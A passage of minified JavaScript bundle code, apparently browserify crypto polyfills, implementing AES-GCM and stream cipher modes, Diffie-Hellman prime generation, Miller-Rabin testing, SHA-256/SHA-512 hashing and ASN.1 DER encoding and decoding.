mode: "CFB8", type: "stream" }, "aes-128-cfb1": { cipher: "AES", key: 128, iv: 16, mode: "CFB1", type: "stream" }, "aes-192-cfb1": { cipher: "AES", key: 192, iv: 16, mode: "CFB1", type: "stream" }, "aes-256-cfb1": { cipher: "AES", key: 256, iv: 16, mode: "CFB1", type: "stream" }, "aes-128-ofb": { cipher: "AES", key: 128, iv: 16, mode: "OFB", type: "stream" }, "aes-192-ofb": { cipher: "AES", key: 192, iv: 16, mode: "OFB", type: "stream" }, "aes-256-ofb": { cipher: "AES", key: 256, iv: 16, mode: "OFB", type: "stream" }, "aes-128-ctr": { cipher: "AES", key: 128, iv: 16, mode: "CTR", type: "stream" }, "aes-192-ctr": { cipher: "AES", key: 192, iv: 16, mode: "CTR", type: "stream" }, "aes-256-ctr": { cipher: "AES", key: 256, iv: 16, mode: "CTR", type: "stream" }, "aes-128-gcm": { cipher: "AES", key: 128, iv: 12, mode: "GCM", type: "auth" }, "aes-192-gcm": { cipher: "AES", key: 192, iv: 12, mode: "GCM", type: "auth" }, "aes-256-gcm": { cipher: "AES", key: 256, iv: 12, mode: "GCM", type: "auth" } } }, function(e, t, n) {
    function i(e, t) { var n = 0;
        e.length !== t.length && n++; for (var i = Math.min(e.length, t.length), r = 0; r < i; ++r) n += e[r] ^ t[r]; return n }

    function r(e, t, n) { if (12 === t.length) return e._finID = s.concat([t, s.from([0, 0, 0, 1])]), s.concat([t, s.from([0, 0, 0, 2])]); var i = new l(n),
            r = t.length,
            o = r % 16;
        i.update(t), o && (o = 16 - o, i.update(s.alloc(o, 0))), i.update(s.alloc(8, 0)); var a = 8 * r,
            c = s.alloc(8);
        c.writeUIntBE(a, 0, 8), i.update(c), e._finID = i.state; var u = s.from(e._finID); return f(u), u }

    function o(e, t, n, i) { c.call(this); var o = s.alloc(4, 0);
        this._cipher = new a.AES(t); var u = this._cipher.encryptBlock(o);
        this._ghash = new l(u), n = r(this, n, u), this._prev = s.from(n), this._cache = s.allocUnsafe(0), this._secCache = s.allocUnsafe(0), this._decrypt = i, this._alen = 0, this._len = 0, this._mode = e, this._authTag = null, this._called = !1 } var a = n(22),
        s = n(1).Buffer,
        c = n(9),
        u = n(0),
        l = n(104),
        d = n(15),
        f = n(51);
    u(o, c), o.prototype._update = function(e) { if (!this._called && this._alen) { var t = 16 - this._alen % 16;
            t < 16 && (t = s.alloc(t, 0), this._ghash.update(t)) } this._called = !0; var n = this._mode.encrypt(this, e); return this._decrypt ? this._ghash.update(e) : this._ghash.update(n), this._len += e.length, n }, o.prototype._final = function() { if (this._decrypt && !this._authTag) throw new Error("Unsupported state or unable to authenticate data"); var e = d(this._ghash.final(8 * this._alen, 8 * this._len), this._cipher.encryptBlock(this._finID)); if (this._decrypt && i(e, this._authTag)) throw new Error("Unsupported state or unable to authenticate data");
        this._authTag = e, this._cipher.scrub() }, o.prototype.getAuthTag = function() { if (this._decrypt || !s.isBuffer(this._authTag)) throw new Error("Attempting to get auth tag in unsupported state"); return this._authTag }, o.prototype.setAuthTag = function(e) { if (!this._decrypt) throw new Error("Attempting to set auth tag in unsupported state");
        this._authTag = e }, o.prototype.setAAD = function(e) { if (this._called) throw new Error("Attempting to set AAD in unsupported state");
        this._ghash.update(e), this._alen += e.length }, e.exports = o }, function(e, t, n) {
    function i(e, t, n, i) { a.call(this), this._cipher = new r.AES(t), this._prev = o.from(n), this._cache = o.allocUnsafe(0), this._secCache = o.allocUnsafe(0), this._decrypt = i, this._mode = e } var r = n(22),
        o = n(1).Buffer,
        a = n(9);
    n(0)(i, a), i.prototype._update = function(e) { return this._mode.encrypt(this, e, this._decrypt) }, i.prototype._final = function() { this._cipher.scrub() }, e.exports = i }, function(e, t, n) {
    function i() { if (null !== y) return y; var e = [];
        e[0] = 2; for (var t = 1, n = 3; n < 1048576; n += 2) { for (var i = Math.ceil(Math.sqrt(n)), r = 0; r < t && e[r] <= i && n % e[r] != 0; r++);
            t !== r && e[r] <= i || (e[t++] = n) } return y = e, e }

    function r(e) { for (var t = i(), n = 0; n < t.length; n++)
            if (0 === e.modn(t[n])) return 0 === e.cmpn(t[n]); return !0 }

    function o(e) { var t = c.mont(e); return 0 === h.toRed(t).redPow(e.subn(1)).fromRed().cmpn(1) }

    function a(e, t) { if (e < 16) return new c(2 === t || 5 === t ? [140, 123] : [140, 39]);
        t = new c(t); for (var n, i;;) { for (n = new c(s(Math.ceil(e / 8))); n.bitLength() > e;) n.ishrn(1); if (n.isEven() && n.iadd(f), n.testn(1) || n.iadd(h), t.cmp(h)) { if (!t.cmp(p))
                    for (; n.mod(b).cmp(m);) n.iadd(v) } else
                for (; n.mod(u).cmp(g);) n.iadd(v); if (i = n.shrn(1), r(i) && r(n) && o(i) && o(n) && d.test(i) && d.test(n)) return n } } var s = n(11);
    e.exports = a, a.simpleSieve = r, a.fermatTest = o; var c = n(3),
        u = new c(24),
        l = n(56),
        d = new l,
        f = new c(1),
        h = new c(2),
        p = new c(5),
        b = (new c(16), new c(8), new c(10)),
        m = new c(3),
        g = (new c(7), new c(11)),
        v = new c(4),
        y = (new c(12), null) }, function(e, t, n) {
    function i(e) { this.rand = e || new o.Rand } var r = n(3),
        o = n(57);
    e.exports = i, i.create = function(e) { return new i(e) }, i.prototype._randbelow = function(e) { var t = e.bitLength(),
            n = Math.ceil(t / 8);
        do { var i = new r(this.rand.generate(n)) } while (i.cmp(e) >= 0); return i }, i.prototype._randrange = function(e, t) { var n = t.sub(e); return e.add(this._randbelow(n)) }, i.prototype.test = function(e, t, n) { var i = e.bitLength(),
            o = r.mont(e),
            a = new r(1).toRed(o);
        t || (t = Math.max(1, i / 48 | 0)); for (var s = e.subn(1), c = 0; !s.testn(c); c++); for (var u = e.shrn(c), l = s.toRed(o); t > 0; t--) { var d = this._randrange(new r(2), s);
            n && n(d); var f = d.toRed(o).redPow(u); if (0 !== f.cmp(a) && 0 !== f.cmp(l)) { for (var h = 1; h < c; h++) { if (f = f.redSqr(), 0 === f.cmp(a)) return !1; if (0 === f.cmp(l)) break } if (h === c) return !1 } } return !0 }, i.prototype.getDivisor = function(e, t) { var n = e.bitLength(),
            i = r.mont(e),
            o = new r(1).toRed(i);
        t || (t = Math.max(1, n / 48 | 0)); for (var a = e.subn(1), s = 0; !a.testn(s); s++); for (var c = e.shrn(s), u = a.toRed(i); t > 0; t--) { var l = this._randrange(new r(2), a),
                d = e.gcd(l); if (0 !== d.cmpn(1)) return d; var f = l.toRed(i).redPow(c); if (0 !== f.cmp(o) && 0 !== f.cmp(u)) { for (var h = 1; h < s; h++) { if (f = f.redSqr(), 0 === f.cmp(o)) return f.fromRed().subn(1).gcd(e); if (0 === f.cmp(u)) break } if (h === s) return f = f.redSqr(), f.fromRed().subn(1).gcd(e) } } return !1 } }, function(e, t, n) {
    function i(e) { this.rand = e } var r; if (e.exports = function(e) { return r || (r = new i(null)), r.generate(e) }, e.exports.Rand = i, i.prototype.generate = function(e) { return this._rand(e) }, i.prototype._rand = function(e) { if (this.rand.getBytes) return this.rand.getBytes(e); for (var t = new Uint8Array(e), n = 0; n < t.length; n++) t[n] = this.rand.getByte(); return t }, "object" == typeof self) self.crypto && self.crypto.getRandomValues ? i.prototype._rand = function(e) { var t = new Uint8Array(e); return self.crypto.getRandomValues(t), t } : self.msCrypto && self.msCrypto.getRandomValues ? i.prototype._rand = function(e) { var t = new Uint8Array(e); return self.msCrypto.getRandomValues(t), t } : "object" == typeof window && (i.prototype._rand = function() { throw new Error("Not implemented yet") });
    else try { var o = n(116); if ("function" != typeof o.randomBytes) throw new Error("Not supported");
        i.prototype._rand = function(e) { return o.randomBytes(e) } } catch (e) {} }, function(e, t, n) { "use strict";

    function i(e, t) { if (Array.isArray(e)) return e.slice(); if (!e) return []; var n = []; if ("string" != typeof e) { for (var i = 0; i < e.length; i++) n[i] = 0 | e[i]; return n } if ("hex" === t) { e = e.replace(/[^a-z0-9]+/gi, ""), e.length % 2 != 0 && (e = "0" + e); for (var i = 0; i < e.length; i += 2) n.push(parseInt(e[i] + e[i + 1], 16)) } else
            for (var i = 0; i < e.length; i++) { var r = e.charCodeAt(i),
                    o = r >> 8,
                    a = 255 & r;
                o ? n.push(o, a) : n.push(a) }
        return n }

    function r(e) { return 1 === e.length ? "0" + e : e }

    function o(e) { for (var t = "", n = 0; n < e.length; n++) t += r(e[n].toString(16)); return t } var a = t;
    a.toArray = i, a.zero2 = r, a.toHex = o, a.encode = function(e, t) { return "hex" === t ? o(e) : e } }, function(e, t, n) { "use strict";

    function i(e, t, n, i) { return 0 === e ? r(t, n, i) : 1 === e || 3 === e ? a(t, n, i) : 2 === e ? o(t, n, i) : void 0 }

    function r(e, t, n) { return e & t ^ ~e & n }

    function o(e, t, n) { return e & t ^ e & n ^ t & n }

    function a(e, t, n) { return e ^ t ^ n }

    function s(e) { return f(e, 2) ^ f(e, 13) ^ f(e, 22) }

    function c(e) { return f(e, 6) ^ f(e, 11) ^ f(e, 25) }

    function u(e) { return f(e, 7) ^ f(e, 18) ^ e >>> 3 }

    function l(e) { return f(e, 17) ^ f(e, 19) ^ e >>> 10 } var d = n(6),
        f = d.rotr32;
    t.ft_1 = i, t.ch32 = r, t.maj32 = o, t.p32 = a, t.s0_256 = s, t.s1_256 = c, t.g0_256 = u, t.g1_256 = l }, function(e, t, n) { "use strict";

    function i() { if (!(this instanceof i)) return new i;
        g.call(this), this.h = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225], this.k = v, this.W = new Array(64) } var r = n(6),
        o = n(16),
        a = n(59),
        s = n(5),
        c = r.sum32,
        u = r.sum32_4,
        l = r.sum32_5,
        d = a.ch32,
        f = a.maj32,
        h = a.s0_256,
        p = a.s1_256,
        b = a.g0_256,
        m = a.g1_256,
        g = o.BlockHash,
        v = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298];
    r.inherits(i, g), e.exports = i, i.blockSize = 512, i.outSize = 256, i.hmacStrength = 192, i.padLength = 64, i.prototype._update = function(e, t) { for (var n = this.W, i = 0; i < 16; i++) n[i] = e[t + i]; for (; i < n.length; i++) n[i] = u(m(n[i - 2]), n[i - 7], b(n[i - 15]), n[i - 16]); var r = this.h[0],
            o = this.h[1],
            a = this.h[2],
            g = this.h[3],
            v = this.h[4],
            y = this.h[5],
            w = this.h[6],
            x = this.h[7]; for (s(this.k.length === n.length), i = 0; i < n.length; i++) { var S = l(x, p(v), d(v, y, w), this.k[i], n[i]),
                _ = c(h(r), f(r, o, a));
            x = w, w = y, y = v, v = c(g, S), g = a, a = o, o = r, r = c(S, _) } this.h[0] = c(this.h[0], r), this.h[1] = c(this.h[1], o), this.h[2] = c(this.h[2], a), this.h[3] = c(this.h[3], g), this.h[4] = c(this.h[4], v), this.h[5] = c(this.h[5], y), this.h[6] = c(this.h[6], w), this.h[7] = c(this.h[7], x) }, i.prototype._digest = function(e) { return "hex" === e ? r.toHex32(this.h, "big") : r.split32(this.h, "big") } }, function(e, t, n) { "use strict";

    function i() { if (!(this instanceof i)) return new i;
        R.call(this), this.h = [1779033703, 4089235720, 3144134277, 2227873595, 1013904242, 4271175723, 2773480762, 1595750129, 1359893119, 2917565137, 2600822924, 725511199, 528734635, 4215389547, 1541459225, 327033209], this.k = P, this.W = new Array(160) }

    function r(e, t, n, i, r) { var o = e & n ^ ~e & r; return o < 0 && (o += 4294967296), o }

    function o(e, t, n, i, r, o) { var a = t & i ^ ~t & o; return a < 0 && (a += 4294967296), a }

    function a(e, t, n, i, r) { var o = e & n ^ e & r ^ n & r; return o < 0 && (o += 4294967296), o }

    function s(e, t, n, i, r, o) { var a = t & i ^ t & o ^ i & o; return a < 0 && (a += 4294967296), a }

    function c(e, t) { var n = y(e, t, 28),
            i = y(t, e, 2),
            r = y(t, e, 7),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o }

    function u(e, t) { var n = w(e, t, 28),
            i = w(t, e, 2),
            r = w(t, e, 7),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o }

    function l(e, t) { var n = y(e, t, 14),
            i = y(e, t, 18),
            r = y(t, e, 9),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o }

    function d(e, t) { var n = w(e, t, 14),
            i = w(e, t, 18),
            r = w(t, e, 9),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o }

    function f(e, t) { var n = y(e, t, 1),
            i = y(e, t, 8),
            r = x(e, t, 7),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o }

    function h(e, t) { var n = w(e, t, 1),
            i = w(e, t, 8),
            r = S(e, t, 7),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o }

    function p(e, t) { var n = y(e, t, 19),
            i = y(t, e, 29),
            r = x(e, t, 6),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o }

    function b(e, t) { var n = w(e, t, 19),
            i = w(t, e, 29),
            r = S(e, t, 6),
            o = n ^ i ^ r; return o < 0 && (o += 4294967296), o } var m = n(6),
        g = n(16),
        v = n(5),
        y = m.rotr64_hi,
        w = m.rotr64_lo,
        x = m.shr64_hi,
        S = m.shr64_lo,
        _ = m.sum64,
        k = m.sum64_hi,
        C = m.sum64_lo,
        A = m.sum64_4_hi,
        E = m.sum64_4_lo,
        T = m.sum64_5_hi,
        M = m.sum64_5_lo,
        R = g.BlockHash,
        P = [1116352408, 3609767458, 1899447441, 602891725, 3049323471, 3964484399, 3921009573, 2173295548, 961987163, 4081628472, 1508970993, 3053834265, 2453635748, 2937671579, 2870763221, 3664609560, 3624381080, 2734883394, 310598401, 1164996542, 607225278, 1323610764, 1426881987, 3590304994, 1925078388, 4068182383, 2162078206, 991336113, 2614888103, 633803317, 3248222580, 3479774868, 3835390401, 2666613458, 4022224774, 944711139, 264347078, 2341262773, 604807628, 2007800933, 770255983, 1495990901, 1249150122, 1856431235, 1555081692, 3175218132, 1996064986, 2198950837, 2554220882, 3999719339, 2821834349, 766784016, 2952996808, 2566594879, 3210313671, 3203337956, 3336571891, 1034457026, 3584528711, 2466948901, 113926993, 3758326383, 338241895, 168717936, 666307205, 1188179964, 773529912, 1546045734, 1294757372, 1522805485, 1396182291, 2643833823, 1695183700, 2343527390, 1986661051, 1014477480, 2177026350, 1206759142, 2456956037, 344077627, 2730485921, 1290863460, 2820302411, 3158454273, 3259730800, 3505952657, 3345764771, 106217008, 3516065817, 3606008344, 3600352804, 1432725776, 4094571909, 1467031594, 275423344, 851169720, 430227734, 3100823752, 506948616, 1363258195, 659060556, 3750685593, 883997877, 3785050280, 958139571, 3318307427, 1322822218, 3812723403, 1537002063, 2003034995, 1747873779, 3602036899, 1955562222, 1575990012, 2024104815, 1125592928, 2227730452, 2716904306, 2361852424, 442776044, 2428436474, 593698344, 2756734187, 3733110249, 3204031479, 2999351573, 3329325298, 3815920427, 3391569614, 3928383900, 3515267271, 566280711, 3940187606, 3454069534, 4118630271, 4000239992, 116418474, 1914138554, 174292421, 2731055270, 289380356, 3203993006, 460393269, 320620315, 685471733, 587496836, 852142971, 1086792851, 1017036298, 365543100, 1126000580, 2618297676, 1288033470, 3409855158, 1501505948, 4234509866, 1607167915, 987167468, 1816402316, 1246189591];
    m.inherits(i, R), e.exports = i, i.blockSize = 1024, i.outSize = 512, i.hmacStrength = 192, i.padLength = 128, i.prototype._prepareBlock = function(e, t) { for (var n = this.W, i = 0; i < 32; i++) n[i] = e[t + i]; for (; i < n.length; i += 2) { var r = p(n[i - 4], n[i - 3]),
                o = b(n[i - 4], n[i - 3]),
                a = n[i - 14],
                s = n[i - 13],
                c = f(n[i - 30], n[i - 29]),
                u = h(n[i - 30], n[i - 29]),
                l = n[i - 32],
                d = n[i - 31];
            n[i] = A(r, o, a, s, c, u, l, d), n[i + 1] = E(r, o, a, s, c, u, l, d) } }, i.prototype._update = function(e, t) { this._prepareBlock(e, t); var n = this.W,
            i = this.h[0],
            f = this.h[1],
            h = this.h[2],
            p = this.h[3],
            b = this.h[4],
            m = this.h[5],
            g = this.h[6],
            y = this.h[7],
            w = this.h[8],
            x = this.h[9],
            S = this.h[10],
            A = this.h[11],
            E = this.h[12],
            R = this.h[13],
            P = this.h[14],
            I = this.h[15];
        v(this.k.length === n.length); for (var D = 0; D < n.length; D += 2) { var O = P,
                j = I,
                q = l(w, x),
                B = d(w, x),
                L = r(w, x, S, A, E),
                N = o(w, x, S, A, E, R),
                F = this.k[D],
                z = this.k[D + 1],
                U = n[D],
                H = n[D + 1],
                V = T(O, j, q, B, L, N, F, z, U, H),
                W = M(O, j, q, B, L, N, F, z, U, H);
            O = c(i, f), j = u(i, f), q = a(i, f, h, p, b), B = s(i, f, h, p, b, m); var K = k(O, j, q, B),
                Y = C(O, j, q, B);
            P = E, I = R, E = S, R = A, S = w, A = x, w = k(g, y, V, W), x = C(y, y, V, W), g = b, y = m, b = h, m = p, h = i, p = f, i = k(V, W, K, Y), f = C(V, W, K, Y) } _(this.h, 0, i, f), _(this.h, 2, h, p), _(this.h, 4, b, m), _(this.h, 6, g, y), _(this.h, 8, w, x), _(this.h, 10, S, A), _(this.h, 12, E, R), _(this.h, 14, P, I) }, i.prototype._digest = function(e) { return "hex" === e ? m.toHex32(this.h, "big") : m.split32(this.h, "big") } }, function(e, t, n) {
    function i(e, t) { if (a.call(this, t), !s.isBuffer(e)) return void this.error("Input not Buffer");
        this.base = e, this.offset = 0, this.length = e.length }

    function r(e, t) { if (Array.isArray(e)) this.length = 0, this.value = e.map(function(e) { return e instanceof r || (e = new r(e, t)), this.length += e.length, e }, this);
        else if ("number" == typeof e) { if (!(0 <= e && e <= 255)) return t.error("non-byte EncoderBuffer value");
            this.value = e, this.length = 1 } else if ("string" == typeof e) this.value = e, this.length = s.byteLength(e);
        else { if (!s.isBuffer(e)) return t.error("Unsupported type: " + typeof e);
            this.value = e, this.length = e.length } } var o = n(0),
        a = n(18).Reporter,
        s = n(2).Buffer;
    o(i, a), t.DecoderBuffer = i, i.prototype.save = function() { return { offset: this.offset, reporter: a.prototype.save.call(this) } }, i.prototype.restore = function(e) { var t = new i(this.base); return t.offset = e.offset, t.length = this.offset, this.offset = e.offset, a.prototype.restore.call(this, e.reporter), t }, i.prototype.isEmpty = function() { return this.offset === this.length }, i.prototype.readUInt8 = function(e) { return this.offset + 1 <= this.length ? this.base.readUInt8(this.offset++, !0) : this.error(e || "DecoderBuffer overrun") }, i.prototype.skip = function(e, t) { if (!(this.offset + e <= this.length)) return this.error(t || "DecoderBuffer overrun"); var n = new i(this.base); return n._reporterState = this._reporterState, n.offset = this.offset, n.length = this.offset + e, this.offset += e, n }, i.prototype.raw = function(e) { return this.base.slice(e ? e.offset : this.offset, this.length) }, t.EncoderBuffer = r, r.prototype.join = function(e, t) { return e || (e = new s(this.length)), t || (t = 0), 0 === this.length ? e : (Array.isArray(this.value) ? this.value.forEach(function(n) { n.join(e, t), t += n.length }) : ("number" == typeof this.value ? e[t] = this.value : "string" == typeof this.value ? e.write(this.value, t) : s.isBuffer(this.value) && this.value.copy(e, t), t += this.length), e) } }, function(e, t, n) { var i = t;
    i._reverse = function(e) { var t = {}; return Object.keys(e).forEach(function(n) {
            (0 | n) == n && (n |= 0); var i = e[n];
            t[i] = n }), t }, i.der = n(148) }, function(e, t, n) {
    function i(e) { this.enc = "der", this.name = e.name, this.entity = e, this.tree = new r, this.tree._init(e.body) }

    function r(e) { u.Node.call(this, "der", e) }

    function o(e, t) { var n = e.readUInt8(t); if (e.isError(n)) return n; var i = d.tagClass[n >> 6],
            r = 0 == (32 & n); if (31 == (31 & n)) { var o = n; for (n = 0; 128 == (128 & o);) { if (o = e.readUInt8(t), e.isError(o)) return o;
                n <<= 7, n |= 127 & o } } else n &= 31; return { cls: i, primitive: r, tag: n, tagStr: d.tag[n] } }

    function a(e, t, n) { var i = e.readUInt8(n); if (e.isError(i)) return i; if (!t && 128 === i) return null; if (0 == (128 & i)) return i; var r = 127 & i; if (r > 4) return e.error("length octect is too long");
        i = 0; for (var o = 0; o < r; o++) { i <<= 8; var a = e.readUInt8(n); if (e.isError(a)) return a;
            i |= a } return i } var s = n(0),
        c = n(17),
        u = c.base,
        l = c.bignum,
        d = c.constants.der;
    e.exports = i, i.prototype.decode = function(e, t) { return e instanceof u.DecoderBuffer || (e = new u.DecoderBuffer(e, t)), this.tree._decode(e, t) }, s(r, u.Node), r.prototype._peekTag = function(e, t, n) { if (e.isEmpty()) return !1; var i = e.save(),
            r = o(e, 'Failed to peek tag: "' + t + '"'); return e.isError(r) ? r : (e.restore(i), r.tag === t || r.tagStr === t || r.tagStr + "of" === t || n) }, r.prototype._decodeTag = function(e, t, n) { var i = o(e, 'Failed to decode tag of "' + t + '"'); if (e.isError(i)) return i; var r = a(e, i.primitive, 'Failed to get length of "' + t + '"'); if (e.isError(r)) return r; if (!n && i.tag !== t && i.tagStr !== t && i.tagStr + "of" !== t) return e.error('Failed to match tag: "' + t + '"'); if (i.primitive || null !== r) return e.skip(r, 'Failed to match body of: "' + t + '"'); var s = e.save(),
            c = this._skipUntilEnd(e, 'Failed to skip indefinite length body: "' + this.tag + '"'); return e.isError(c) ? c : (r = e.offset - s.offset, e.restore(s), e.skip(r, 'Failed to match body of: "' + t + '"')) }, r.prototype._skipUntilEnd = function(e, t) { for (;;) { var n = o(e, t); if (e.isError(n)) return n; var i = a(e, n.primitive, t); if (e.isError(i)) return i; var r; if (r = n.primitive || null !== i ? e.skip(i) : this._skipUntilEnd(e, t), e.isError(r)) return r; if ("end" === n.tagStr) break } }, r.prototype._decodeList = function(e, t, n, i) { for (var r = []; !e.isEmpty();) { var o = this._peekTag(e, "end"); if (e.isError(o)) return o; var a = n.decode(e, "der", i); if (e.isError(a) && o) break;
            r.push(a) } return r }, r.prototype._decodeStr = function(e, t) { if ("bitstr" === t) { var n = e.readUInt8(); return e.isError(n) ? n : { unused: n, data: e.raw() } } if ("bmpstr" === t) { var i = e.raw(); if (i.length % 2 == 1) return e.error("Decoding of string type: bmpstr length mismatch"); for (var r = "", o = 0; o < i.length / 2; o++) r += String.fromCharCode(i.readUInt16BE(2 * o)); return r } if ("numstr" === t) { var a = e.raw().toString("ascii"); return this._isNumstr(a) ? a : e.error("Decoding of string type: numstr unsupported characters") } if ("octstr" === t) return e.raw(); if ("objDesc" === t) return e.raw(); if ("printstr" === t) { var s = e.raw().toString("ascii"); return this._isPrintstr(s) ? s : e.error("Decoding of string type: printstr unsupported characters") } return /str$/.test(t) ? e.raw().toString() : e.error("Decoding of string type: " + t + " unsupported") }, r.prototype._decodeObjid = function(e, t, n) { for (var i, r = [], o = 0; !e.isEmpty();) { var a = e.readUInt8();
            o <<= 7, o |= 127 & a, 0 == (128 & a) && (r.push(o), o = 0) } 128 & a && r.push(o); var s = r[0] / 40 | 0,
            c = r[0] % 40; if (i = n ? r : [s, c].concat(r.slice(1)), t) { var u = t[i.join(" ")];
            void 0 === u && (u = t[i.join(".")]), void 0 !== u && (i = u) } return i }, r.prototype._decodeTime = function(e, t) { var n = e.raw().toString(); if ("gentime" === t) var i = 0 | n.slice(0, 4),
            r = 0 | n.slice(4, 6),
            o = 0 | n.slice(6, 8),
            a = 0 | n.slice(8, 10),
            s = 0 | n.slice(10, 12),
            c = 0 | n.slice(12, 14);
        else { if ("utctime" !== t) return e.error("Decoding " + t + " time is not supported yet"); var i = 0 | n.slice(0, 2),
                r = 0 | n.slice(2, 4),
                o = 0 | n.slice(4, 6),
                a = 0 | n.slice(6, 8),
                s = 0 | n.slice(8, 10),
                c = 0 | n.slice(10, 12);
            i = i < 70 ? 2e3 + i : 1900 + i } return Date.UTC(i, r - 1, o, a, s, c, 0) }, r.prototype._decodeNull = function(e) { return null }, r.prototype._decodeBool = function(e) { var t = e.readUInt8(); return e.isError(t) ? t : 0 !== t }, r.prototype._decodeInt = function(e, t) { var n = e.raw(),
            i = new l(n); return t && (i = t[i.toString(10)] || i), i }, r.prototype._use = function(e, t) { return "function" == typeof e && (e = e(t)), e._getDecoder("der").tree } }, function(e, t, n) {
    function i(e) { this.enc = "der", this.name = e.name, this.entity = e, this.tree = new r, this.tree._init(e.body) }

    function r(e) { l.Node.call(this, "der", e) }

    function o(e) { return e < 10 ? "0" + e : e }

    function a(e, t, n, i) { var r; if ("seqof" === e ? e = "seq" : "setof" === e && (e = "set"), d.tagByName.hasOwnProperty(e)) r = d.tagByName[e];
        else { if ("number" != typeof e || (0 | e) !== e) return i.error("Unknown tag: " + e);
            r = e } return r >= 31 ? i.error("Multi-octet tag encoding unsupported") : (t || (r |= 32), r |= d.tagClassByName[n || "universal"] << 6) } var s = n(0),
        c = n(2).Buffer,
        u = n(17),
        l = u.base,
        d = u.constants.der;
    e.exports = i, i.prototype.encode = function(e, t) { return this.tree._encode(e, t).join() }, s(r, l.Node), r.prototype._encodeComposite = function(e, t, n, i) { var r = a(e, t, n, this.reporter); if (i.length < 128) { var o = new c(2); return o[0] = r, o[1] = i.length, this._createEncoderBuffer([o, i]) } for (var s = 1, u = i.length; u >= 256; u >>= 8) s++; var o = new c(2 + s);
        o[0] = r, o[1] = 128 | s; for (var u = 1 + s, l = i.length; l > 0; u--, l >>= 8) o[u] = 255 & l; return this._createEncoderBuffer([o, i]) }, r.prototype._encodeStr = function(e, t) { if ("bitstr" === t) return this._createEncoderBuffer([0 | e.unused, e.data]); if ("bmpstr" === t) { for (var n = new c(2 * e.length), i = 0; i < e.length; i++) n.writeUInt16BE(e.charCodeAt(i), 2 * i); return this._createEncoderBuffer(n) } return "numstr" === t ? this._isNumstr(e) ? this._createEncoderBuffer(e) : this.reporter.error("Encoding of string type: numstr supports only digits and space") : "printstr" === t ? this._isPrintstr(e) ? this._createEncoderBuffer(e) : this.reporter.error("Encoding of string type: printstr supports only latin upper and lower case letters, digits, space, apostrophe, left and rigth parenthesis, plus sign, comma, hyphen, dot, slash, colon, equal sign, question mark") : /str$/.test(t) ? this._createEncoderBuffer(e) : "objDesc" === t ? this._createEncoderBuffer(e) : this.reporter.error("Encoding of string type: " + t + " unsupported") }, r.prototype._encodeObjid = function(e, t, n) { if ("string" == typeof e) { if (!t) return this.reporter.error("string objid given, but no values map found"); if (!t.hasOwnProperty(e)) return this.reporter.error("objid not found in values map");
            e = t[e].split(/[\s\.]+/g); for (var i = 0; i < e.length; i++) e[i] |= 0 } else if (Array.isArray(e)) { e = e.slice(); for (var i = 0; i < e.length; i++) e[i] |= 0 } if (!Array.isArray(e)) return this.reporter.error("objid() should be either array or string, got: " + JSON.stringify(e)); if (!n) { if (e[1] >= 40) return this.reporter.error("Second objid identifier OOB");
            e.splice(0, 2, 40 * e[0] + e[1]) } for (var r = 0, i = 0; i < e.length; i++) { var o = e[i]; for (r++; o >= 128; o >>= 7) r++ } for (var a = new c(r), s = a.length - 1, i = e.length - 1; i >= 0; i--) { var o = e[i]; for (a[s--] = 127 & o;
                (o >>= 7) > 0;) a[s--] = 128 | 127 & o } return this._createEncoderBuffer(a) }, r.prototype._encodeTime = function(e, t) { var n, i = new Date(e); return "gentime" === t ? n = [o(i.getFullYear()), o(i.getUTCMonth() + 1), o(i.getUTCDate()), o(i.getUTCHours()), o(i.getUTCMinutes()), o(i.getUTCSeconds()), "Z"].join("") : "utctime" === t ? n = [o(i.getFullYear() % 100), o(i.getUTCMonth() + 1), o(i.getUTCDate()), o(i.getUTCHours()), o(i.getUTCMinutes()), o(i.getUTCSeconds()), "Z"].join("") : this.reporter.error("Encoding " + t + " time is not supported yet"), this._encodeStr(n, "octstr") }, r.prototype._encodeNull = function() { return this._createEncoderBuffer("") }, r.prototype._encodeInt = function(e, t) { if ("string" == typeof e) { if (!t) return this.reporter.error("String int or enum given, but no values map"); if (!t.hasOwnProperty(e)) return this.reporter.error("Values map doesn't contain: " + JSON.stringify(e));
            e = t[e] } if ("number" != typeof e && !c.isBuffer(e)) { var n = e.toArray();!e.sign && 128 & n[0] && n.unshift(0), e = new c(n) } if (c.isBuffer(e)) { var i = e.length;
            0 === e.length && i++; var r = new c(i); return e.copy(r), 0 === e.length && (r[0] = 0), this._createEncoderBuffer(r) } if (e < 128) return this._createEncoderBuffer(e); if (e < 256) return this._createEncoderBuffer([0, e]); for (var i = 1, o = e; o >= 256; o >>= 8) i++; for (var r = new Array(i), o = r.length - 1; o >= 0; o--) r[o] = 255 & e, e >>= 8; return 128 & r[0] && r.unshift(0), this._createEncoderBuffer(new c(r)) }, r.prototype._encodeBool = function(e) { return this._createEncoderBuffer(e ? 255 : 0) }, r.prototype._use = function(e, t) { return "function" == typeof e && (e = e(t)), e._getEncoder("der").tree }, r.prototype._skipDefault = function(e, t, n) { var i, r = this._baseState; if (null === r.default) return !1; var o = e.join(); if (void 0 === r.defaultBuffer && (r.defaultBuffer = this._encodeValue(r.default, t, n).join()), o.length !== r.defaultBuffer.length) return !1; for (i = 0; i < o.length; i++)
